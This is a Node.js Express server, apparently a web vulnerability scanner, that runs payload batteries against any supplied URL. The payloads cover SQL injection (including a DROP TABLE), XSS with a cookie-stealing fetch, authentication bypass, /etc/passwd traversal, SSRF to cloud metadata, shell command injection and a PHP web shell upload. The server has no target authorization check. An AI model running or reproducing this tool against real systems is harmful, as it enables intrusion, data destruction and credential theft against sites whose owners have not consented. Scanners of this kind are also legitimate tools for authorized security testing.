const express = require("express");
const cors = require("cors");
const { exec, spawn } = require("child_process");
const fs = require("fs").promises;
const path = require("path");
const crypto = require("crypto");
const axios = require("axios");

const app = express();
const PORT = process.env.SANDBOX_PORT || 3002;
const MAIN_APP_URL = process.env.MAIN_APP_URL || "http://localhost:5173";

// Middleware
app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// Security middleware - rate limiting
const rateLimiter = new Map();
const RATE_LIMIT = 10; // requests per minute
const RATE_WINDOW = 60000; // 1 minute

const checkRateLimit = (req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const now = Date.now();

  if (!rateLimiter.has(ip)) {
    rateLimiter.set(ip, { count: 1, resetTime: now + RATE_WINDOW });
    return next();
  }

  const limit = rateLimiter.get(ip);
  if (now > limit.resetTime) {
    rateLimiter.set(ip, { count: 1, resetTime: now + RATE_WINDOW });
    return next();
  }

  if (limit.count >= RATE_LIMIT) {
    return res.status(429).json({ error: "Rate limit exceeded" });
  }

  limit.count++;
  next();
};

app.use(checkRateLimit);

// Logging middleware
const logRequest = (req, res, next) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${req.method} ${req.path} - ${req.ip}`);
  next();
};

app.use(logRequest);

// Individual exploit classes
class ExploitRunner {
  constructor() {
    this.activeTests = new Map();
    this.testResults = new Map();
  }

  async runExploit(exploitType, targetUrl, options = {}) {
    const testId = crypto.randomUUID();
    const startTime = Date.now();

    this.activeTests.set(testId, {
      exploitType,
      targetUrl,
      startTime,
      status: "running",
      options,
    });

    try {
      let result;

      switch (exploitType) {
        case "sql_injection":
          result = await this.testSQLInjection(targetUrl, options);
          break;
        case "xss":
          result = await this.testXSS(targetUrl, options);
          break;
        case "csrf":
          result = await this.testCSRF(targetUrl, options);
          break;
        case "auth_bypass":
          result = await this.testAuthBypass(targetUrl, options);
          break;
        case "directory_traversal":
          result = await this.testDirectoryTraversal(targetUrl, options);
          break;
        case "open_redirect":
          result = await this.testOpenRedirect(targetUrl, options);
          break;
        case "ssrf":
          result = await this.testSSRF(targetUrl, options);
          break;
        case "command_injection":
          result = await this.testCommandInjection(targetUrl, options);
          break;
        case "file_upload":
          result = await this.testFileUpload(targetUrl, options);
          break;
        case "cors_misconfiguration":
          result = await this.testCORSMisconfiguration(targetUrl, options);
          break;
        default:
          throw new Error(`Unknown exploit type: ${exploitType}`);
      }

      const endTime = Date.now();
      const duration = endTime - startTime;

      const finalResult = {
        testId,
        exploitType,
        targetUrl,
        status: "completed",
        duration,
        timestamp: new Date().toISOString(),
        ...result,
      };

      this.testResults.set(testId, finalResult);
      this.activeTests.delete(testId);

      return finalResult;
    } catch (error) {
      const endTime = Date.now();
      const duration = endTime - startTime;

      const errorResult = {
        testId,
        exploitType,
        targetUrl,
        status: "failed",
        duration,
        timestamp: new Date().toISOString(),
        error: error.message,
        vulnerable: false,
        findings: [],
      };

      this.testResults.set(testId, errorResult);
      this.activeTests.delete(testId);

      return errorResult;
    }
  }

  async testSQLInjection(targetUrl, options) {
    const payloads = [
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT NULL--",
      "'; DROP TABLE users--",
      "' OR SLEEP(5)--",
      "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    ];

    const findings = [];
    let vulnerable = false;

    for (const payload of payloads) {
      try {
        const testUrl = `${targetUrl}?id=${encodeURIComponent(payload)}`;
        const startTime = Date.now();

        const response = await axios.get(testUrl, {
          timeout: 10000,
          validateStatus: () => true,
        });

        const responseTime = Date.now() - startTime;

        // Check for SQL error messages
        const errorPatterns = [
          /mysql_fetch_array/i,
          /ORA-\d{5}/i,
          /Microsoft.*ODBC.*SQL Server/i,
          /PostgreSQL.*ERROR/i,
          /Warning.*mysql_/i,
          /valid MySQL result/i,
          /MySqlClient\./i,
          /syntax error/i,
          /unexpected end of SQL command/i,
        ];

        const hasErrorPattern = errorPatterns.some((pattern) =>
          pattern.test(response.data),
        );

        if (hasErrorPattern) {
          vulnerable = true;
          findings.push({
            type: "sql_error_disclosure",
            payload,
            evidence: "SQL error messages detected in response",
            severity: "high",
            responseTime,
          });
        }

        // Check for time-based injection
        if (payload.includes("SLEEP") && responseTime > 4000) {
          vulnerable = true;
          findings.push({
            type: "time_based_injection",
            payload,
            evidence: `Response time: ${responseTime}ms (expected delay)`,
            severity: "critical",
            responseTime,
          });
        }

        // Check for union-based injection
        if (payload.includes("UNION") && response.data.length > 1000) {
          vulnerable = true;
          findings.push({
            type: "union_based_injection",
            payload,
            evidence: "Unusually large response suggesting successful UNION",
            severity: "critical",
            responseTime,
          });
        }
      } catch (error) {
        // Network errors might indicate successful injection
        if (error.code === "ECONNRESET" || error.code === "ETIMEDOUT") {
          findings.push({
            type: "connection_disruption",
            payload,
            evidence: `Connection error: ${error.code}`,
            severity: "medium",
          });
        }
      }
    }

    return {
      vulnerable,
      findings,
      testedPayloads: payloads.length,
      riskLevel: vulnerable
        ? findings.some((f) => f.severity === "critical")
          ? "critical"
          : "high"
        : "low",
    };
  }

  async testXSS(targetUrl, options) {
    const payloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src=javascript:alert('XSS')>",
      "'\"><script>alert('XSS')</script>",
      "<script>fetch('/steal-cookies?c='+document.cookie)</script>",
    ];

    const findings = [];
    let vulnerable = false;

    for (const payload of payloads) {
      try {
        const testUrl = `${targetUrl}?q=${encodeURIComponent(payload)}`;

        const response = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true,
        });

        // Check if payload is reflected in response
        if (
          response.data.includes(payload) ||
          response.data.includes(payload.replace(/[<>]/g, ""))
        ) {
          vulnerable = true;
          findings.push({
            type: "reflected_xss",
            payload,
            evidence: "Payload reflected in HTTP response",
            severity: "high",
            location: "query_parameter",
          });
        }

        // Check for script execution indicators
        const scriptPatterns = [
          /<script[^>]*>.*alert.*<\/script>/i,
          /<img[^>]*onerror[^>]*>/i,
          /<svg[^>]*onload[^>]*>/i,
        ];

        const hasScriptPattern = scriptPatterns.some((pattern) =>
          pattern.test(response.data),
        );

        if (hasScriptPattern) {
          vulnerable = true;
          findings.push({
            type: "script_injection",
            payload,
            evidence: "JavaScript execution context detected",
            severity: "critical",
            location: "response_body",
          });
        }
      } catch (error) {
        console.log(`XSS test error for payload ${payload}:`, error.message);
      }
    }

    return {
      vulnerable,
      findings,
      testedPayloads: payloads.length,
      riskLevel: vulnerable
        ? findings.some((f) => f.severity === "critical")
          ? "critical"
          : "high"
        : "low",
    };
  }

  async testCSRF(targetUrl, options) {
    const findings = [];
    let vulnerable = false;

    try {
      // Test POST endpoint without CSRF token
      const postData = {
        username: "testuser",
        password: "testpass",
        action: "login",
      };

      const response = await axios.post(targetUrl, postData, {
        timeout: 5000,
        validateStatus: () => true,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: "http://malicious-site.com",
        },
      });

      // Check if request was processed without CSRF protection
      if (
        response.status === 200 &&
        !response.data.includes("csrf") &&
        !response.data.includes("token")
      ) {
        vulnerable = true;
        findings.push({
          type: "missing_csrf_protection",
          evidence: "POST request accepted without CSRF token",
          severity: "high",
          method: "POST",
        });
      }

      // Check for CSRF token in forms
      const formResponse = await axios.get(targetUrl, {
        timeout: 5000,
        validateStatus: () => true,
      });

      const hasCSRFToken =
        /name=['"]_token['"]|name=['"]csrf_token['"]|csrf|_token/i.test(
          formResponse.data,
        );

      if (
        !hasCSRFToken &&
        /<form[^>]*method=['"]post['"][^>]*>/i.test(formResponse.data)
      ) {
        vulnerable = true;
        findings.push({
          type: "form_without_csrf",
          evidence: "Form with POST method found without CSRF token",
          severity: "medium",
          method: "GET",
        });
      }
    } catch (error) {
      console.log("CSRF test error:", error.message);
    }

    return {
      vulnerable,
      findings,
      riskLevel: vulnerable ? "high" : "low",
    };
  }

  async testAuthBypass(targetUrl, options) {
    const findings = [];
    let vulnerable = false;

    const bypassPayloads = [
      { type: "sql_auth_bypass", username: "admin' --", password: "anything" },
      {
        type: "sql_auth_bypass",
        username: "admin' OR '1'='1' --",
        password: "anything",
      },
      { type: "null_byte", username: "admin\x00", password: "password" },
      { type: "case_sensitivity", username: "ADMIN", password: "admin" },
      { type: "array_bypass", username: ["admin"], password: ["password"] },
    ];

    for (const payload of bypassPayloads) {
      try {
        const response = await axios.post(
          targetUrl,
          {
            username: payload.username,
            password: payload.password,
          },
          {
            timeout: 5000,
            validateStatus: () => true,
          },
        );

        // Check for successful authentication indicators
        const successPatterns = [
          /welcome|dashboard|logout|profile/i,
          /success.*login/i,
          /authenticated/i,
        ];

        const isSuccess =
          successPatterns.some((pattern) => pattern.test(response.data)) ||
          response.status === 302; // Redirect often indicates success

        if (isSuccess) {
          vulnerable = true;
          findings.push({
            type: payload.type,
            payload: `${payload.username}:${payload.password}`,
            evidence: "Authentication bypass successful",
            severity: "critical",
          });
        }
      } catch (error) {
        console.log(
          `Auth bypass test error for ${payload.type}:`,
          error.message,
        );
      }
    }

    return {
      vulnerable,
      findings,
      testedPayloads: bypassPayloads.length,
      riskLevel: vulnerable ? "critical" : "low",
    };
  }

  async testDirectoryTraversal(targetUrl, options) {
    const payloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
    ];

    const findings = [];
    let vulnerable = false;

    for (const payload of payloads) {
      try {
        const testUrl = `${targetUrl}?file=${encodeURIComponent(payload)}`;

        const response = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true,
        });

        // Check for system file contents
        const systemFilePatterns = [
          /root:x:0:0:/, // /etc/passwd
          /localhost/, // hosts file
          /\[boot loader\]/i, // boot.ini
          /# Copyright/, // various system files
        ];

        const hasSystemFile = systemFilePatterns.some((pattern) =>
          pattern.test(response.data),
        );

        if (hasSystemFile) {
          vulnerable = true;
          findings.push({
            type: "directory_traversal",
            payload,
            evidence: "System file contents detected in response",
            severity: "critical",
          });
        }
      } catch (error) {
        console.log(
          `Directory traversal test error for payload ${payload}:`,
          error.message,
        );
      }
    }

    return {
      vulnerable,
      findings,
      testedPayloads: payloads.length,
      riskLevel: vulnerable ? "critical" : "low",
    };
  }

  async testOpenRedirect(targetUrl, options) {
    const payloads = [
      "http://evil.com",
      "https://malicious-site.com",
      "//evil.com",
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
    ];

    const findings = [];
    let vulnerable = false;

    for (const payload of payloads) {
      try {
        const testUrl = `${targetUrl}?redirect=${encodeURIComponent(payload)}`;

        const response = await axios.get(testUrl, {
          timeout: 5000,
          validateStatus: () => true,
          maxRedirects: 0, // Don't follow redirects
        });

        // Check for redirect response
        if (response.status >= 300 && response.status < 400) {
          const location = response.headers.location;

          if (
            location &&
            (location.includes("evil.com") ||
              location.includes("malicious-site.com") ||
              location === payload)
          ) {
            vulnerable = true;
            findings.push({
              type: "open_redirect",
              payload,
              evidence: `Redirect to external domain: ${location}`,
              severity: "medium",
            });
          }
        }
      } catch (error) {
        console.log(
          `Open redirect test error for payload ${payload}:`,
          error.message,
        );
      }
    }

    return {
      vulnerable,
      findings,
      testedPayloads: payloads.length,
      riskLevel: vulnerable ? "medium" : "low",
    };
  }

  async testSSRF(targetUrl, options) {
    const payloads = [
      "http://169.254.169.254/latest/meta-data/", // AWS metadata
      "http://localhost:22",
      "http://127.0.0.1:3306",
      "file:///etc/passwd",
      "gopher://127.0.0.1:3306",
    ];

    const findings = [];
    let vulnerable = false;

    for (const payload of payloads) {
      try {
        const testUrl = `${targetUrl}?url=${encodeURIComponent(payload)}`;
        const startTime = Date.now();

        const response = await axios.get(testUrl, {
          timeout: 10000,
          validateStatus: () => true,
        });

        const responseTime = Date.now() - startTime;

        // Check for AWS metadata
        if (
          payload.includes("169.254.169.254") &&
          response.data.includes("instance-id")
        ) {
          vulnerable = true;
          findings.push({
            type: "aws_metadata_access",
            payload,
            evidence: "AWS instance metadata accessible",
            severity: "critical",
          });
        }

        // Check for internal service responses
        if (responseTime > 100 && response.status !== 404) {
          vulnerable = true;
          findings.push({
            type: "internal_service_access",
            payload,
            evidence: `Internal service responded (${responseTime}ms)`,
            severity: "high",
          });
        }
      } catch (error) {
        console.log(`SSRF test error for payload ${payload}:`, error.message);
      }
    }

    return {
      vulnerable,
      findings,
      testedPayloads: payloads.length,
      riskLevel: vulnerable
        ? findings.some((f) => f.severity === "critical")
          ? "critical"
          : "high"
        : "low",
    };
  }

  async testCommandInjection(targetUrl, options) {
    const payloads = [
      "; ls -la",
      "| whoami",
      "& ping -c 3 127.0.0.1",
      "`id`",
      "$(uname -a)",
      "; cat /etc/passwd",
    ];

    const findings = [];
    let vulnerable = false;

    for (const payload of payloads) {
      try {
        const testUrl = `${targetUrl}?cmd=${encodeURIComponent(payload)}`;
        const startTime = Date.now();

        const response = await axios.get(testUrl, {
          timeout: 15000,
          validateStatus: () => true,
        });

        const responseTime = Date.now() - startTime;

        // Check for command output patterns
        const commandPatterns = [
          /uid=\d+\(.*\)/, // id command output
          /Linux.*GNU/, // uname output
          /root:x:0:0:/, // /etc/passwd
          /total \d+/, // ls -la output
          /PING.*bytes/, // ping output
        ];

        const hasCommandOutput = commandPatterns.some((pattern) =>
          pattern.test(response.data),
        );

        if (hasCommandOutput) {
          vulnerable = true;
          findings.push({
            type: "command_injection",
            payload,
            evidence: "Command execution output detected",
            severity: "critical",
          });
        }

        // Check for time-based injection (ping command)
        if (payload.includes("ping") && responseTime > 2000) {
          vulnerable = true;
          findings.push({
            type: "time_based_command_injection",
            payload,
            evidence: `Response delay indicates command execution (${responseTime}ms)`,
            severity: "critical",
          });
        }
      } catch (error) {
        console.log(
          `Command injection test error for payload ${payload}:`,
          error.message,
        );
      }
    }

    return {
      vulnerable,
      findings,
      testedPayloads: payloads.length,
      riskLevel: vulnerable ? "critical" : "low",
    };
  }

  async testFileUpload(targetUrl, options) {
    const findings = [];
    let vulnerable = false;

    const testFiles = [
      {
        name: "test.php",
        content: '<?php echo "PHP execution test"; ?>',
        contentType: "application/x-php",
      },
      {
        name: "test.jsp",
        content: '<% out.println("JSP execution test"); %>',
        contentType: "application/x-jsp",
      },
      {
        name: "test.asp",
        content: '<% Response.Write("ASP execution test") %>',
        contentType: "application/x-asp",
      },
      {
        name: "../../../evil.php",
        content: '<?php system($_GET["cmd"]); ?>',
        contentType: "application/x-php",
      },
    ];

    for (const file of testFiles) {
      try {
        const FormData = require("form-data");
        const form = new FormData();
        form.append("file", file.content, {
          filename: file.name,
          contentType: file.contentType,
        });

        const response = await axios.post(targetUrl, form, {
          timeout: 5000,
          validateStatus: () => true,
          headers: form.getHeaders(),
        });

        // Check for successful upload
        if (
          response.status === 200 &&
          (response.data.includes("uploaded") ||
            response.data.includes("success"))
        ) {
          vulnerable = true;
          findings.push({
            type: "unrestricted_file_upload",
            filename: file.name,
            evidence: "Potentially dangerous file uploaded successfully",
            severity: file.name.includes("..") ? "critical" : "high",
          });
        }
      } catch (error) {
        console.log(`File upload test error for ${file.name}:`, error.message);
      }
    }

    return {
      vulnerable,
      findings,
      testedFiles: testFiles.length,
      riskLevel: vulnerable
        ? findings.some((f) => f.severity === "critical")
          ? "critical"
          : "high"
        : "low",
    };
  }

  async testCORSMisconfiguration(targetUrl, options) {
    const findings = [];
    let vulnerable = false;

    const testOrigins = [
      "http://evil.com",
      "https://malicious-site.com",
      "null",
      "http://localhost:3000",
    ];

    for (const origin of testOrigins) {
      try {
        const response = await axios.get(targetUrl, {
          timeout: 5000,
          validateStatus: () => true,
          headers: {
            Origin: origin,
          },
        });

        const allowOrigin = response.headers["access-control-allow-origin"];
        const allowCredentials =
          response.headers["access-control-allow-credentials"];

        // Check for wildcard CORS
        if (allowOrigin === "*") {
          vulnerable = true;
          findings.push({
            type: "wildcard_cors",
            evidence: "Access-Control-Allow-Origin: * detected",
            severity: "medium",
          });
        }

        // Check for reflected origin
        if (allowOrigin === origin && origin.includes("evil")) {
          vulnerable = true;
          findings.push({
            type: "reflected_cors",
            origin,
            evidence: `Malicious origin reflected: ${allowOrigin}`,
            severity: "high",
          });
        }

        // Check for credentials with wildcard
        if (allowOrigin === "*" && allowCredentials === "true") {
          vulnerable = true;
          findings.push({
            type: "cors_credentials_wildcard",
            evidence: "Wildcard origin with credentials enabled",
            severity: "critical",
          });
        }
      } catch (error) {
        console.log(`CORS test error for origin ${origin}:`, error.message);
      }
    }

    return {
      vulnerable,
      findings,
      testedOrigins: testOrigins.length,
      riskLevel: vulnerable
        ? findings.some((f) => f.severity === "critical")
          ? "critical"
          : "medium"
        : "low",
    };
  }

  getActiveTests() {
    return Array.from(this.activeTests.entries()).map(([id, test]) => ({
      id,
      ...test,
      duration: Date.now() - test.startTime,
    }));
  }

  getTestResult(testId) {
    return this.testResults.get(testId);
  }

  getAllResults() {
    return Array.from(this.testResults.values());
  }
}

// Initialize exploit runner
const exploitRunner = new ExploitRunner();

// Routes
app.get("/health", (req, res) => {
  res.json({ status: "healthy", timestamp: new Date().toISOString() });
});

app.post("/exploit/:type", async (req, res) => {
  try {
    const { type } = req.params;
    const { targetUrl, options = {} } = req.body;

    if (!targetUrl) {
      return res.status(400).json({ error: "targetUrl is required" });
    }

    console.log(`Starting exploit test: ${type} against ${targetUrl}`);

    const result = await exploitRunner.runExploit(type, targetUrl, options);

    res.json(result);
  } catch (error) {
    console.error("Exploit test error:", error);
    res.status(500).json({ error: error.message });
  }
});

app.get("/exploits/active", (req, res) => {
  res.json(exploitRunner.getActiveTests());
});

app.get("/exploits/results", (req, res) => {
  res.json(exploitRunner.getAllResults());
});

app.get("/exploits/results/:testId", (req, res) => {
  const { testId } = req.params;
  const result = exploitRunner.getTestResult(testId);

  if (!result) {
    return res.status(404).json({ error: "Test result not found" });
  }

  res.json(result);
});

app.get("/exploits/types", (req, res) => {
  res.json([
    {
      type: "sql_injection",
      name: "SQL Injection",
      description: "Tests for SQL injection vulnerabilities",
      severity: "critical",
    },
    {
      type: "xss",
      name: "Cross-Site Scripting",
      description: "Tests for XSS vulnerabilities",
      severity: "high",
    },
    {
      type: "csrf",
      name: "Cross-Site Request Forgery",
      description: "Tests for CSRF protection",
      severity: "high",
    },
    {
      type: "auth_bypass",
      name: "Authentication Bypass",
      description: "Tests for authentication bypass vulnerabilities",
      severity: "critical",
    },
    {
      type: "directory_traversal",
      name: "Directory Traversal",
      description: "Tests for path traversal vulnerabilities",
      severity: "critical",
    },
    {
      type: "open_redirect",
      name: "Open Redirect",
      description: "Tests for open redirect vulnerabilities",
      severity: "medium",
    },
    {
      type: "ssrf",
      name: "Server-Side Request Forgery",
      description: "Tests for SSRF vulnerabilities",
      severity: "critical",
    },
    {
      type: "command_injection",
      name: "Command Injection",
      description: "Tests for OS command injection",
      severity: "critical",
    },
    {
      type: "file_upload",
      name: "File Upload",
      description: "Tests for file upload vulnerabilities",
      severity: "high",
    },
    {
      type: "cors_misconfiguration",
      name: "CORS Misconfiguration",
      description: "Tests for CORS security issues",
      severity: "medium",
    },
  ]);
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error("Unhandled error:", error);
  res.status(500).json({ error: "Internal server error" });
});

// Start server
app.listen(PORT, () => {
  console.log(`Security testing sandbox running on port ${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/health`);
});

module.exports = app;
